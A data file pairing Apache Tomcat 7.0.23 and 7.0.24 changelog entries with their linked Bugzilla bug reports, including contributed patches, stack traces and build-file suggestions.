Catalina|Tomcat 7.0.24 (markt)|fix|52387|Ensure that the correct host is used when configuring logging when Tomcat is embedded. Patch provided by David Calavera. (markt)|org.catalina.tomcat.startup.Tomcat#silence method doesn't use the host where we add the applications|"Created attachment 28100 [details]
This patch solves the issue

This method calls ""getHost"" but it should get the host from the methods that call it because the host can be different."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52387
Catalina|Tomcat 7.0.24 (markt)|update|52405|Align the Servlet 3.0 implementation with the changes defined in the first maintenance release (also know as Rev. A). See the JCP documentation for a detailed list of changes (markt)|Update to Servlet 3.0 Rev A|"The list of changes is here:
http://jcp.org/aboutJava/communityprocess/maintenance/jsr315/servlet3-mr-reva.html
There are 20 changes that need to be checked / made."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52405
Catalina|Tomcat 7.0.24 (markt)|fix||Improve JMX names for objects related to Connectors that have the address attribute set. (markt)|||
Catalina|Tomcat 7.0.24 (markt)|fix||Remove some stale attributes from MBeans. (rjung)|||
Catalina|Tomcat 7.0.24 (markt)|code||Move destruction of ContainerBase objects to ContainerBase to ensure that they are destroyed. (markt)|||
Catalina|Tomcat 7.0.24 (markt)|fix|52443|Change the behaviour of the default Realm in the embedded use case so it is set once on the Engine rather than on every Context thereby avoiding the Lifecycle issues with having the same Realm set on multiple Contexts. (markt)|Tomcat#defaultRealm shares Realm instance between web applications, resulting in INFO log message from lifecycle|"Created attachment 28129 [details]
2012-01-09_trunk_TestTomcat_twoapps.patch

Inspired by this thread on dev@:
http://tomcat.markmail.org/thread/5qxa7gjsaav4ytcd
""problem using default Realm in new unit tests""

The problem is the following:

1. Tomcat.getDefaultRealm() is effectively a factory method for some Realm instance. It creates this Realm once and caches it as Tomcat#defaultRealm

2. Tomcat.addWebapp() method calls ctx.setRealm(defaultRealm); for every Context that it creates. Thus the Realm instance is shared between web applications.

3. When Context starts it calls start() method on the realm. When the above method was used to create several web applications then during the start of the second and later ones the following message is logged:

09.01.2012 19:19:29 org.apache.catalina.util.LifecycleBase start
INFO: The start() method was called on component [Realm[Simple]] after start() had already been called. The second call will be ignored.

To reproduce:
1) Apply attached patch to org.apache.catalina.startup.TestTomcat of trunk.
2) Run the test.
3) See the above ""The start() method was called"" message in the logs.


I think there are several ways to resolve this:
a) Do not call start() on the Realm if it is already started, as indicated by Lifecycle.getState()
b) Change Tomcat class to do not share the Realm instance between Contexts. b.1) assign it to the Engine, or
b.2) create a new instance every time.


The a) way may lead to problems when the Context is stopped. It is not clear whether the Realm shall be stopped or not. It it is stopped it will affect another webapp. It may also cause problems with asynchronous start of contexts implemented in 7.0.23+.

The b) way is consistent with what happens when server.xml is parsed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52443
Catalina|Tomcat 7.0.24 (markt)|add||Provide a new Realm implementation, the NullRealm, that does not contain any users and is used as the default Realm implementation (rather than the JAAS Realm which was used prior to this change) if no Realm is specified. (markt)|||
Catalina|Tomcat 7.0.24 (markt)|fix|52461|Don't assume file based URLs when checking last modified times for global and host level web.xml files. Patch provided by violetagg. (markt)|"java.lang.IllegalArgumentException: URI scheme is not ""file"" is thrown in ContextConfig.getDefaultWebXmlFragment"|"Hello,

I have a project that embeds Apache Tomcat in OSGi. I provide the default web.xml from my bundles (jar files) directly; I do not provide it in a separate folder on the file system. 

I am using Apache Tomcat 7.0.21, but now I want to migrate to Apache Tomcat 7.0.23. 

Unfortunately there is a change between these two versions and with Apache Tomcat 7.0.23 the following exception is thrown:

Caused by: java.lang.IllegalArgumentException: URI scheme is not ""file""
	at java.io.File.<init>(File.java:366)
	at org.apache.catalina.startup.ContextConfig.getDefaultWebXmlFragment(ContextConfig.java:1317)
	at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1168)
	at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:828)
	at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:302)
	at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:119)
	at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
	at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5148)
	at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
	... 71 more|

In OSGi environment URI scheme is not ""file"", but ""bundleresource"". 
The call ""globalWebXml.getSystemId()"" in OSGi environment returns ""bundleresource://94.fwk2102834054/conf/web.xml""

I would like to propose a change (below) in ContextConfig.getDefaultWebXmlFragment() method because there is no guarantee that the URI scheme will always be ""file"". The patch is made against 7.0.x trunc.

I‚Äôm looking forward to your comments.

Best Regards
Violeta Georgieva

Patch proposal:

Index: ContextConfig.java
===================================================================
--- ContextConfig.java	(revision 1230565)
+++ ContextConfig.java	(working copy)
@@ -29,7 +29,6 @@
 import java.io.UnsupportedEncodingException;
 import java.net.JarURLConnection;
 import java.net.MalformedURLException;
-import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.URL;
 import java.net.URLConnection;
@@ -1324,20 +1323,24 @@
         
         if (globalWebXml != null) {
             try {
-                File f = new File(new URI(globalWebXml.getSystemId()));
-                globalTimeStamp = f.lastModified();
-            } catch (URISyntaxException e) {
+                URL f = new URL(globalWebXml.getSystemId());
+                globalTimeStamp = f.openConnection().getLastModified();
+            } catch (MalformedURLException e) {
                 globalTimeStamp = -1;
-            }
+            } catch (IOException e) {
+            	globalTimeStamp = -1;
+			}
         }
         
         if (hostWebXml != null) {
             try {
-                File f = new File(new URI(hostWebXml.getSystemId()));
-                hostTimeStamp = f.lastModified();
-            } catch (URISyntaxException e) {
+                URL f = new URL(hostWebXml.getSystemId());
+                hostTimeStamp = f.openConnection().getLastModified();
+            } catch (MalformedURLException e) {
                 hostTimeStamp = -1;
-            }
+            } catch (IOException e) {
+            	globalTimeStamp = -1;
+			}
         }
         
         if (entry != null && entry.getGlobalTimeStamp() == globalTimeStamp &&"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52461
Catalina|Tomcat 7.0.24 (markt)|add||Add test cases for the BASIC and NonLogin Authenticators when not using SSO. Patch provided by Brian Burch. (markt)|||
Coyote|Tomcat 7.0.24 (markt)|add|52028|Add support for automatic binding to a free port by a connector if the special value of zero is used for the port. This is mainly useful in embedded and testing scenarios. (markt)|Embeded Tomcat using a Connector with a random port (port 0)|New feature based on discussion: http://markmail.org/message/3nczqiqm6smez255|https://bz.apache.org/bugzilla/show_bug.cgi?id=52028
Coyote|Tomcat 7.0.24 (markt)|update||Remove obsolete emptySessionPath JMX attribute. (rjung)|||
Coyote|Tomcat 7.0.24 (markt)|fix||Correct error in fix for 49683. (markt)|Separate keep-alive and connection timeout with APR/native connector|"Originally observed as part of bug 48648.

If a keepAliveTimeout is specified it is used for connectionTimeout as well.

Fixing this may require changes to the native code too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49683
Coyote|Tomcat 7.0.24 (markt)|fix||Ensure that the process of unlocking the acceptor thread does not trigger processing of the connection as if it were a valid request. (markt)|||
Jasper|Tomcat 7.0.24 (markt)|fix|52450|Add setter for entityResolver in ParserUtils. This is mainly useful when jasper and dtds are in different class loaders. (mturk)|Add setter for entityResolver in jasper's ParserUtils|"Created attachment 28138 [details]
Patch

In some cases (e.g. OSGi web modules) jasper.jar and dtds will be in different classloaders making the need for setting up custom entity resolver so dtds can be retrieved. A simple patch is attached.
This is already added in Glassfish's jasper fork and Jetty project is making use of it. Applying the patch will allow using Tomcat's Jasper in Jetty instead of Glassfish's one. See http://git.eclipse.org/c/jetty/org.eclipse.jetty.project.git/tree/jetty-osgi/jetty-osgi-boot-jsp/src/main/java/org/eclipse/jetty/osgi/boot/jasper/WebappRegistrationCustomizerImpl.java?id=306947b1420beed76c772e546eb3120b3bf4b112#n181 for details about the change and why it was needed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52450
Jasper|Tomcat 7.0.24 (markt)|fix|52321|Ensure that the order of multiple prelude/coda values for JSP pages is respected. (markt)|coda/prelude order not respected|"WebXml (http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/java/org/apache/catalina/deploy/WebXml.java) and in ApplicationJspConfigDescriptor (http://svn.apache.org/repos/asf/tomcat/tc7.0.x/trunk/java/org/apache/catalina/core/ApplicationJspConfigDescriptor.java) jspPropertyGroups are HashSet but this kind of set doesn't preserve the order in which elements are added. However it should be guaranteed to be spec compliant.

Using a LinkedHashSet instead of the HashSet fixes this issues."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52321
Jasper|Tomcat 7.0.24 (markt)|fix|52335|Only handle <\% and not \% as escaped in template text. (markt)|Tomcat escapes all the \% in Template Text as %.|"hi,

I noticed that there is a problem at the % escape on Tomcat 5.5.34.

(1)The problem
    The JSP Specification 2.0 says:
    ------
    JSP.1.6 Quoting and Escape Conventions
    ‚Üí Quoting in Template Text
     „ÄÄ„ÉªA literal <% is quoted by <\%
    ------

    But the result of the % escape on Tomcat 5.5.34 is :
    ------
    Not only the \% of <\% is escaped as %.
    All the \% in Template Text is escaped as %.
    ------

    If I want to show \% on the HTML page, it is needed to write \\% in a JSP file.

    The problem  also occurs on Tomcat 5.5.23 or Tomcat7.0.8.
    And it seems that the problem has already occured on Tomcat 5.5.0.

(2)The reason
    The reason of the problem is that the following method is not implemented
    according to JSP Specification.
         „ÉªThe class:
                org.apache.jasper.compiler.Parser
         „ÉªThe method:
               void parseTemplateText(Node parent)
         „ÉªThe part of source:
           ------
           else if (ch == '\\') {
                if (!reader.hasMoreInput()) {
                    ttext.write('\\');
                    break;
                }
                // Look for \% or \$
                // Only recognize \$ if isELIgnored is false
                char next = (char)reader.peekChar();
                if (next == '%' || (next == '$' && !pageInfo.isELIgnored())) { ‚ñ≤
                    ch = reader.nextChar();
                }
            }
           ------

Is it a bug?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52335
Jasper|Tomcat 7.0.24 (markt)|fix|52440|Ensure that when using ValueExpression.getValueReference() if the expression is an EL variable that the value returned is the ValueReference for the ValueExpression associated with the EL variable. (markt)|Wrong getValueReference behaviour with Facelets parameter expressions|"ValueExpression method getValueReference should return base object and property. But it returns null if ValueExpression is Facelets parameter.
Example:

someVar = #{concreteObject.property}

ValueExpression for #{someVar} return null from method getValueReference (guess because it is simple expression #{someVar}), but logicaly it should return parent expressions ValueReference (need hierachical ValueReference lookup).

I made workaround with Java Reflect API in my code and it illustrates problem:

ELContext elContext = FacesContext.getCurrentInstance().getELContext();
ValueReference reference = exp.getValueReference(elContext);
        
if (reference == null && exp instanceof TagValueExpressionUEL) {
	ValueExpressionImpl origExp = (ValueExpressionImpl) ((TagValueExpressionUEL) exp).getWrapped();
            
	// TODO: JR: find better way to get base and property. ! Code is not portable because uses Tomcat EL implementation details. ! 
	Field field = ReflectionUtils.findField(origExp.getClass(), EL_IMPL_VAR_PROPERTY);
	field.setAccessible(true);
	VariableMapper varMapper = (VariableMapper) ReflectionUtils.getField(field, origExp);
    field = ReflectionUtils.findField(origExp.getClass(), EL_IMPL_NODE_PROPERTY);
    field.setAccessible(true);
    SimpleNode node = (SimpleNode) ReflectionUtils.getField(field, origExp);

    if (varMapper != null && node != null) {
		ValueExpression parentExp = varMapper.resolveVariable(node.getImage());
        if (parentExp != null) {
			try {
				reference = parentExp.getValueReference(elContext);

                if (reference == null) {
					reference = getValueReference(parentExp);
                }
            } catch (PropertyNotFoundException e) {
				LOG.warn(""Property not found: "" + e.getMessage());
            }
        }
    }
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=52440
Jasper|Tomcat 7.0.24 (markt)|fix|52445|Don't assume that EL method expressions have exactly three components (identifier, method name, parameters). (markt)|Methodexpression with arguments fails on nested properties|"This is basically an improvement of issue 50449 https://issues.apache.org/bugzilla/show_bug.cgi?id=50449

Invoking a method expression with arguments fails on nested properties. I.e. #{bean.submit('foo')} works, but #{bean.nested.submit('foo')} does not work. 

com.example.Bean:
-------------------------------------------------------------------------------
package com.example;

import javax.faces.bean.ManagedBean;
import javax.faces.bean.RequestScoped;

@ManagedBean
@RequestScoped
public class Bean {

    public void submit1() {
        System.out.println(""Submit1 without argument"");
    }

    public void submit1(String argument) {
        System.out.println(""Submit1 with argument "" + argument);
    }

    public void submit2(String argument) {
        System.out.println(""Submit2 with argument "" + argument);
    }

    public Bean getNested() {
        return new Bean();
    }

}
-------------------------------------------------------------------------------

test.xhtml
-------------------------------------------------------------------------------
<!DOCTYPE html>
<html lang=""en""
  xmlns=""http://www.w3.org/1999/xhtml""
  xmlns:h=""http://java.sun.com/jsf/html"">
  <h:head>
    <title>Tomcat nested methodexpression test</title>
  </h:head>
  <h:body>
    <h:form>
      <h:commandButton value=""bean.submit1 without argument"" 
        action=""#{bean.submit1()}"" /><br/>
      <h:commandButton value=""bean.submit1 with argument"" 
        action=""#{bean.submit1('foo')}"" /><br/>
      <h:commandButton value=""bean.submit2 with argument"" 
        action=""#{bean.submit2('bar')}"" /><br/>
      <h:commandButton value=""bean.nested.submit1 without argument"" 
        action=""#{bean.nested.submit1()}"" /><br/>
      <h:commandButton value=""bean.nested.submit1 with argument"" 
        action=""#{bean.nested.submit1('foo')}"" /><br/>
      <h:commandButton value=""bean.nested.submit2 nested bean with argument"" 
        action=""#{bean.nested.submit2('bar')}"" /><br/>
    </h:form>
  </h:body>
</html>
-------------------------------------------------------------------------------

Open the page and invoke the 6 buttons in sequence from top to bottom. The result is:
-------------------------------------------------------------------------------
Submit1 without argument
Submit1 with argument foo
Submit2 with argument bar
Submit1 without argument
Submit1 without argument
Jan 09, 2012 11:21:45 PM com.sun.faces.lifecycle.InvokeApplicationPhase execute
WARNING: #{bean.nested.submit2('bar')}: javax.el.MethodNotFoundException: /test.xhtml @27,50 action=""#{bean.nested.submit2('bar')}"": Method not found: com.example.Bean@4f88bc88.submit2()
javax.faces.FacesException: #{bean.nested.submit2('bar')}: javax.el.MethodNotFoundException: /test.xhtml @27,50 action=""#{bean.nested.submit2('bar')}"": Method not found: com.example.Bean@4f88bc88.submit2()
	at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:110)
	at javax.faces.component.UICommand.broadcast(UICommand.java:315)
	at javax.faces.component.UIViewRoot.broadcastEvents(UIViewRoot.java:794)
	at javax.faces.component.UIViewRoot.processApplication(UIViewRoot.java:1259)
	at com.sun.faces.lifecycle.InvokeApplicationPhase.execute(InvokeApplicationPhase.java:81)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
	at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:118)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:593)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:224)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:169)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:168)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:98)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:928)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:987)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:539)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:300)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
	at java.lang.Thread.run(Thread.java:722)
Caused by: javax.faces.el.MethodNotFoundException: javax.el.MethodNotFoundException: /test.xhtml @27,50 action=""#{bean.nested.submit2('bar')}"": Method not found: com.example.Bean@4f88bc88.submit2()
	at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:92)
	at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:102)
	... 23 more
Caused by: javax.el.MethodNotFoundException: /test.xhtml @27,50 action=""#{bean.nested.submit2('bar')}"": Method not found: com.example.Bean@4f88bc88.submit2()
	at com.sun.faces.facelets.el.TagMethodExpression.invoke(TagMethodExpression.java:109)
	at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:88)
	... 24 more
-------------------------------------------------------------------------------

Note that the 5th button invokes the wrong method (the one without arguments) and that the 6th button throws an exception that the method cannot be found. It's basically looking for a method without arguments.

This exception occurs regardless of if Mojarra or MyFaces is used. I tested with Mojarra 2.1.4 and MyFaces 2.1.3 on Tomcat 7.0.23."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52445
Web applications|Tomcat 7.0.24 (markt)|add|38216|Add the ability to invoke MBean operations to the JMX proxy servlet in the Manager application. Based on a patch by Christopher Hlubek. (markt)|Extend Jmxproxy to allow call of MBean Operations|"Currently one can only query Beans or set/get Attributes of them. It would be
good if a certain operation of a MBean could be called by the Jmxproxy Servlet."|https://bz.apache.org/bugzilla/show_bug.cgi?id=38216
Web applications|Tomcat 7.0.24 (markt)|update||Further clarify the relation between values used by RemoteIpValve and RemoteIpFilter and their use by AccessLogValve. (kkolinko)|||
Web applications|Tomcat 7.0.24 (markt)|fix|52243|Improve windows service documentation to clarify how to include # and/or ; in the value of an environment variable that is passed to the service. (markt)|Documentation of Service-Installer missing one information|"The documentation of the windows service installier is missing one information.

If one wants to create a service with a sepified PATH, it may not work:

Citadation from the documentation:
http://tomcat.apache.org/tomcat-7.0-doc/windows-service-howto.html

List of environment variables that will be provided to the service in the form key=value. They are separated using either # or ; characters.

Original documentation:
http://commons.apache.org/daemon/procrun.html
List of environment variables that will be provided to the service in the form key=value. They are separated using either # or ; characters. If you need to embed either # or ; character within a value put them inside single quotes.

The last part is important, but missing:
""If you need to embed either # or ; character within a value put them inside single quotes.""

The ';' is the windows path-seperator-char and the path has to be masked by ' if it contains more than one directory.

This is missing in 5.5 and 6.0 as well."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52243
Web applications|Tomcat 7.0.24 (markt)|fix|52366|Fix typo in VirtualWebappLoader documentation (configuration example). (rjung)|Problem with the Loader Component documentation|"The documentation on VirtualWebappLoader provides the following example:
virtualClasspath=""${catalina_base}/myapp_config"" which doesn't work and should be:
virtualClasspath=""${catalina.base}/myapp_config"" - mind the dot (and not underscore).
This is annoying because one can spend 2 hours not having a clue that the path is wrong because there is not validation that the path exists at class load.
It would be nice if the class verified the existence of the path at start-up and printed a warning in case it doesn't exist..."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52366
Web applications|Tomcat 7.0.24 (markt)|update||Replace Bugzilla search link on ROOT/index.jsp page with one pointing to the bug reporting page of Tomcat site. (kkolinko)|||
Web applications|Tomcat 7.0.24 (markt)|update||Move MBean dump code from JMXProxyServlet into a utility class. (rjung)|||
Tribes|Tomcat 7.0.24 (markt)|fix|52208|Fix threading issue that may lead to harmless NPE during shutdown that has occasionally been observed when running the unit tests. (markt)|NullPointerException in tribes.transport.nio.NioReceiver.listen() in test run|"Created attachment 27968 [details]
TEST-org.apache.catalina.tribes.group.interceptors.TestOrderInterceptor.BIO.txt

Running tests for 7.0.23 release candidate I noted that there was a NullPointerException in one of tribes tests:

TEST-org.apache.catalina.tribes.group.interceptors.TestOrderInterceptor.BIO.txt

18.11.2011 9:27:56 org.apache.catalina.tribes.transport.nio.NioReceiver listen
SEVERE: Unable to process request in NioReceiver
java.lang.NullPointerException
	at org.apache.catalina.tribes.transport.nio.NioReceiver.listen(NioReceiver.java:274)
	at org.apache.catalina.tribes.transport.nio.NioReceiver.run(NioReceiver.java:414)
	at java.lang.Thread.run(Thread.java:662)
------------- ---------------- ---------------

The test case did not fail, so it likely occurred during tearDown.

The line in source code is

268        while (doListen() && selector != null) {
(..)
272                events();
273                socketTimeouts();
274                int n = selector.select(getSelectorTimeout());

It is likely that selector field referenced on line 274 became null because of NioReceiver#stopListening() call.

This issue was not observed on reruns.

I am attaching complete log file from this test."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52208
Tribes|Tomcat 7.0.24 (markt)|fix||52213, 52354, 52355 and 52356: Fix some potential concurrency issues in FastQueue. (markt)|"Field ""org.apache.catalina.tribes.transport.bio.util.FastQueue.enabled"" should be volatile."|"The boolean flag ""org.apache.catalina.tribes.transport.bio.util.FastQueue.enabled"" may be read/written by multiple threads concurrently (See <http://svn.apache.org/repos/asf/!svn/bc/1203897/tomcat/trunk/java/org/apache/catalina/tribes/group/interceptors/MessageDispatchInterceptor.java>). Therefore, accesses to it should be properly synchronized. It is sufficient to make this boolean flag volatile to protect access to it.

See <https://www.securecoding.cert.org/confluence/display/java/VNA00-J.+Ensure+visibility+when+accessing+shared+primitive+variables> for more information about this bug pattern.

Keshmesh (https://keshmesh.cs.illinois.edu/) is an Eclipse plugin that
analyzes the source code of Java programs for common concurrency bug patterns. We used Keshmesh to detect this concurrency bug pattern."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52213
jdbc-pool|Tomcat 7.0.24 (markt)|add||r1207712: Pool cleaner should be a global thread, not spawn one thread per connection pool. (fhanik)|||https://svn.apache.org/viewvc?view=rev&rev=1207712
Other|Tomcat 7.0.24 (markt)|update||Update Apache Commons Daemon to 1.0.8. (mturk)|||
Other|Tomcat 7.0.24 (markt)|update||Update Apache Commons Pool to 1.5.7. (kkolinko)|||
Other|Tomcat 7.0.24 (markt)|fix||Fix line ends in .gitignore files contained in source distributions. (rjung)|||
Other|Tomcat 7.0.24 (markt)|fix||Run Mapper performance test twice if the first run took too long, to ignore occasional failures. (kkolinko)|||
Other|Tomcat 7.0.24 (markt)|fix||Align .gitignore and build.xml exclude patterns with svn:ignore. (kkolinko)|||
Other|Tomcat 7.0.24 (markt)|fix||Configure defaultexcludes for Ant 1.8.1/1.8.2. The .git and .gitignore patterns are in since Ant 1.8.2, but we include .gitignore in src distributions. (kkolinko)|||
Other|Tomcat 7.0.24 (markt)|add|52237|Allow JUnit logs to be generated in formats other than plain text. Patch provided by M Hasko. (markt/kkolinko)|build.xml file improvement to allow not just plaintext junit logs.|"MOTIVATION:
* be able to generate xml logs from JUnit tests (can then be transformed to html)
* reuse as much code as available

IMPLEMENTATION:
* added <property name=""junit.formatter.type"" value=""plain""/>
* added <property name=""junit.formatter.extension"" value="".txt""/>
* removed the default '.txt' junit logs extension
* changed the junit <formatter> to use junit.formatter.{type|extension} properties

USAGE:
* custom build file including the original one:
<project name=""importing"" basedir=""."" default=""deploy"">
  <import file=""build.xml""/>
  <target name=""test-xml"">
    <antcall target=""test"">
      <param name=""junit.formatter.type"" value=""xml""/>
      <param name=""junit.formatter.extension"" value="".xml""/>
    </antcall>
  </target>
</project>

Patch based on 'trunk' branch revision 1205789

Please change the 'Component' field if necessary. 'Packaging' seemed to be the most appropriate for build.xml changes."|https://bz.apache.org/bugzilla/show_bug.cgi?id=52237
Other|Tomcat 7.0.24 (markt)|fix||Fix build condition for tomcat-dbcp to always rebuild when a new version of commons-pool or commons-dbcp is downloaded. (kkolinko)|||
Other|Tomcat 7.0.24 (markt)|update||Add example of configuration for SetCharacterEncodingFilter to the default web.xml file. (kkolinko)|||
Other|Tomcat 7.0.24 (markt)|update||Switch unit tests to bind Connectors to localhost rather than all available IP addresses. (markt)|||
Other|Tomcat 7.0.24 (markt)|update||Update to Eclipse JDT Compiler 3.7.1. (markt)|||
Other|Tomcat 7.0.24 (markt)|update||Add Netbeans nbproject folder to svn:ignore and .gitignore. (rjung)|||
Other|Tomcat 7.0.24 (markt)|update||Align .gitignore with trunk. (rjung)|||
Catalina|Tomcat 7.0.23 (markt)|add|46264|Add the ability to start and stop containers (primarily Contexts) using a thread pool rather than a single thread. This can significantly improve start and stop time. Based on patches by Joe Kislo and Felix Schumacher. (markt)|Shutting down tomcat with large number of contexts is slow|"Shutting down tomcat with large number of contexts is slow

On some of our sandbox testing environments, we have tomcat loaded with 30-40 contexts, and run a very large heap (2-3GB).  Most of these contexts are large applications which take anywhere from 5-10 seconds to shutdown each.  Most of the time spent shutting down each application is not spent using the local app server CPU, but shutting down remote resources (Announcing the application is going down over JMS, flushing write buffers, closing DB connections, closing JMS connections, closing log connections, etc.).  Shutting down tomcat typically takes minutes, because it shuts down one context at a time."|https://bz.apache.org/bugzilla/show_bug.cgi?id=46264
Catalina|Tomcat 7.0.23 (markt)|fix|50570|Enable FIPS mode to be set in AprLifecycleListener. Based upon a patch from Chris Beckey. (schultz/kkolinko)|Allow explicit use of FIPS mode in APR lifecycle listener|"Both OpenSSL and JSSE allow themselves to be put into FIPS mode, and we should allow SSL connectors to request it (and have them fail if FIPS mode can't be set).

OpenSSL:
http://www.mail-archive.com/openssl-dev@openssl.org/msg20882.html"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50570
Catalina|Tomcat 7.0.23 (markt)|fix|51744|Throw the correct exception if an application attempts to modify the associated JNDI context. (markt)|JNDI Lookup Error after a Context is closed|"I was integrating Atomikos into Tomcat to register the transaction manager, and the lookup for the transaction manager works fine in JNDI, unless someone else, looks up a JNDI context and closes it. And subsequent calls to lookup the transaction manager also fails saying java:comp is not found. I went through the code and found the problem at ""org.apache.naming.SelectorContext"". When methods of that class is calls, those are delegated to a Context received through ""getBoundContext()"", which returns a ""org.apache.naming.NamingContext"" object. And these are stored in a map in ContextBindings class. So the getBoundContext checks this cache, and if it's found it returns it or else, create a new object and store it and returns it. So the problem happens, if someone calls ""close()"" in the NamingContext object. Then it's implemented in the following way,

   public void close()
        throws NamingException {
        env.clear();
    }

Which just clears the environment, but it doesn't in no way invalidate that cache in the ContextBindings class to remove its entry. So in the next time also when getBoundContext is called to get the same context, it will return the earlier 'closed' context without creating a new one. And the environment it has would be cleared and subsequent lookups done from that will fail. 

So I guess the proper fix would be to remove that context from ContextBinding's cache when its close method is closed.

Cheers,
Anjana."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51744
Catalina|Tomcat 7.0.23 (markt)|add|51744|Add an option to the StandardContext that allows exception throwing when an application attempts to modify the associated JNDI context to be disabled. (markt)|JNDI Lookup Error after a Context is closed|"I was integrating Atomikos into Tomcat to register the transaction manager, and the lookup for the transaction manager works fine in JNDI, unless someone else, looks up a JNDI context and closes it. And subsequent calls to lookup the transaction manager also fails saying java:comp is not found. I went through the code and found the problem at ""org.apache.naming.SelectorContext"". When methods of that class is calls, those are delegated to a Context received through ""getBoundContext()"", which returns a ""org.apache.naming.NamingContext"" object. And these are stored in a map in ContextBindings class. So the getBoundContext checks this cache, and if it's found it returns it or else, create a new object and store it and returns it. So the problem happens, if someone calls ""close()"" in the NamingContext object. Then it's implemented in the following way,

   public void close()
        throws NamingException {
        env.clear();
    }

Which just clears the environment, but it doesn't in no way invalidate that cache in the ContextBindings class to remove its entry. So in the next time also when getBoundContext is called to get the same context, it will return the earlier 'closed' context without creating a new one. And the environment it has would be cleared and subsequent lookups done from that will fail. 

So I guess the proper fix would be to remove that context from ContextBinding's cache when its close method is closed.

Cheers,
Anjana."|https://bz.apache.org/bugzilla/show_bug.cgi?id=51744
Catalina|Tomcat 7.0.23 (markt)|fix|51910|Prevent NPE on connector stop if Comet applications are being used without the CometConnectionManagerValve. (markt)|NPE in comet processing when shutting down Tomcat|"I've hit it when testing 7.0.22 RC.

1. Configure Tomcat with NIO connector
2. Start Tomcat and open Comet chat example
http://localhost:8080/examples/jsp/chat/index.jsp
3. Type some Nickname and press button to start chat
The chat log will be in the second frame at the lower half of the page.
4. While chat log is active (Browser shows page as being loaded),
shut down Tomcat.
5. Observe NPE in the logs:

28.09.2011 15:55:32 org.apache.coyote.AbstractProtocol stop
INFO: Stopping ProtocolHandler [""http-nio-8080""]
28.09.2011 15:55:33 org.apache.catalina.connector.CoyoteAdapter event
SEVERE: null
java.lang.NullPointerException
        at org.apache.catalina.core.StandardWrapperValve.event(StandardWrapperValve.java:354)
        at org.apache.catalina.core.StandardContextValve.event(StandardContextValve.java:192)
        at org.apache.catalina.valves.ValveBase.event(ValveBase.java:226)
        at org.apache.catalina.core.StandardHostValve.event(StandardHostValve.java:245)
        at org.apache.catalina.valves.ValveBase.event(ValveBase.java:226)
        at org.apache.catalina.valves.ValveBase.event(ValveBase.java:226)
        at org.apache.catalina.core.StandardEngineValve.event(StandardEngineValve.java:138)
        at org.apache.catalina.connector.CoyoteAdapter.event(CoyoteAdapter.java:211)
        at org.apache.coyote.http11.Http11NioProcessor.event(Http11NioProcessor.java:131)
        at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.>
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1554)
        at org.apache.tomcat.util.net.NioEndpoint.processSocket(NioEndpoint.java:717)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.cancelledKey(NioEndpoint.java:1026)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.processKey(NioEndpoint.java:1169)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.timeout(NioEndpoint.java:1352)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.run(NioEndpoint.java:1085)
        at java.lang.Thread.run(Thread.java:662)
28.09.2011 15:55:33 org.apache.coyote.AbstractProtocol stop
INFO: Stopping ProtocolHandler [""ajp-bio-8009""]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=51910
